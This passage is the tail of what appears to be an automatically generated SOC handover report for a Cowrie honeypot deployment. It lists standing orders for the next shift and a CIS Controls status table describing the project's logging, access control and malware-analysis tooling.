| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 25 recon entry/entries in table (7 group(s) consolidating 143 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-20T10:34:23Z_
